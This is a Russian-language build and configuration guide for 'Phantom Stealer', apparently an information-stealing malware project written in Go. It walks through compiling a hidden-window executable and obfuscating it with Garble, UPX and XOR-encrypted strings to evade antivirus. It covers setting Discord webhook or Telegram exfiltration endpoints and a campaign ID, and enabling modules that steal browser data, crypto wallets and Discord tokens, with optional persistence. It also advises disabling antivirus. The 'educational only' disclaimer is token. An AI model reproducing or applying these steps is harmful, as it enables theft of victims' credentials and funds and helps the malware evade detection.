# Инструкция по компиляции Phantom Stealer

## Требования

1. **Go 1.21 или выше**
   - Скачать: https://golang.org/dl/
   - Установить и добавить в PATH
   - Проверить: `go version`

2. **C компилятор (для CGO)**
   - Вариант 1: MinGW-w64 - https://www.mingw-w64.org/downloads/
   - Вариант 2: TDM-GCC - https://jmeubank.github.io/tdm-gcc/
   - Вариант 3: Visual Studio Build Tools - https://visualstudio.microsoft.com/downloads/#build-tools-for-visual-studio-2022
   - Добавить gcc в PATH
   - Проверить: `gcc --version`

3. **PowerShell** (уже установлен в Windows)

## Способ 1: Использование build.ps1 (Рекомендуется)

### Базовая компиляция:
```powershell
cd "c:\Users\Admin\Desktop\phantom-stealer-master"
.\build.ps1
```

### Компиляция с обфускацией (Garble):
```powershell
# Сначала установите Garble:
go install mvdan.cc/garble@latest

# Затем компилируйте:
.\build.ps1 -Garble
```

### Компиляция с UPX сжатием:
```powershell
# Установите UPX: https://upx.github.io/
.\build.ps1 -UPX
```

### Компиляция всех опций:
```powershell
.\build.ps1 -Garble -UPX -Output "myfile.exe"
```

### Отладочная версия:
```powershell
.\build.ps1 -Debug
```

## Способ 2: Ручная компиляция через Go

### Простая компиляция:
```powershell
cd "c:\Users\Admin\Desktop\phantom-stealer-master"

# Включить CGO (обязательно для SQLite3)
$env:CGO_ENABLED = "1"
$env:CC = "gcc"

# Установить зависимости
go mod tidy

# Компилировать
go build -ldflags "-s -w -H windowsgui" -o phantom.exe .
```

### Компиляция без консольного окна:
```powershell
go build -ldflags "-s -w -H windowsgui" -o phantom.exe .
```

### Компиляция с удалением путей:
```powershell
go build -trimpath -ldflags "-s -w -H windowsgui" -o phantom.exe .
```

## Параметры компиляции

### ldflags параметры:
- `-s` - убрать таблицу символов (меньше размер)
- `-w` - убрать DWARF отладочную информацию
- `-H windowsgui` - скрыть консольное окно (GUI приложение)

### build флаги:
- `-trimpath` - убрать пути к файлам из бинарника (безопасность)

## Настройка конфигурации перед компиляцией

Перед компиляцией отредактируйте `config/config.go`:

```go
// Установите Discord webhook:
DiscordWebhook = "https://discord.com/api/webhooks/YOUR_WEBHOOK_ID/YOUR_WEBHOOK_TOKEN"

// Или Telegram:
TelegramToken  = "YOUR_BOT_TOKEN"
TelegramChatID = "YOUR_CHAT_ID"

// Измените BuildID:
BuildID = "your-campaign-id"

// Включите/выключите модули:
StealBrowsers  = true
StealCrypto    = true
StealDiscord   = true
Persistence    = false  // рекомендуется false для тестирования
```

## Решение проблем

### Ошибка: "go: command not found"
- Установите Go и добавьте в PATH
- Перезапустите PowerShell после установки

### Ошибка: "gcc: command not found"
- Установите MinGW-w64 или другой C компилятор
- Добавьте путь к gcc в PATH (обычно `C:\mingw64\bin`)

### Ошибка: "CGO_ENABLED: false"
```powershell
$env:CGO_ENABLED = "1"
$env:CC = "gcc"
```

### Ошибка компиляции SQLite3:
- Убедитесь, что CGO включен
- Установите правильный C компилятор
- Проверьте, что gcc работает: `gcc --version`

### Антивирус блокирует компиляцию:
- Временно отключите антивирус
- Добавьте папку проекта в исключения
- Или используйте виртуальную машину

## Проверка результата

После компиляции проверьте:
```powershell
# Размер файла
(Get-Item phantom.exe).Length / 1KB

# Проверка, что файл создан
Test-Path phantom.exe

# Запуск (на свой страх и риск!)
# .\phantom.exe
```

## Безопасность

⚠️ **ВАЖНО:**
1. Этот проект предназначен только для образовательных целей
2. Использование для незаконных действий является преступлением
3. Перед тестированием настройте webhook на тестовый сервер
4. Не распространяйте скомпилированные версии

## Альтернативные методы обфускации

1. **Garble** (рекомендуется):
```bash
go install mvdan.cc/garble@latest
garble -literals build -ldflags "-s -w -H windowsgui" -o phantom.exe .
```

2. **UPX сжатие** (может вызвать срабатывание AV):
```bash
upx --best --lzma phantom.exe
```

3. **Ручная обфускация строк**:
- Замените все строковые литералы в `config/config.go`
- Используйте XOR шифрование для webhook URL

